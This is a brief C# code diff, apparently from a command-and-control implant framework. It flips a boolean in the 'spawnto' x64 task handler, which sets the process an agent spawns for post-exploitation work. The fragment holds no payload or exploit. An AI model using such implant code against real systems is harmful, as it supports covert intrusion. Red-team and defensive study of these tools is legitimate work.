@@ -45,7 +45,7 @@ namespace Tasks
             {
                 TaskResponse resp;
                 SpawnToArgsx64 parameters = _jsonSerializer.Deserialize<SpawnToArgsx64>(_data.Parameters);
-                if (_agent.GetProcessManager().SetSpawnTo(parameters.Application, parameters.Arguments, false))
+                if (_agent.GetProcessManager().SetSpawnTo(parameters.Application, parameters.Arguments, true))
                 {
                     var sacParams = _agent.GetProcessManager().GetStartupInfo();
                     resp = CreateTaskResponse(
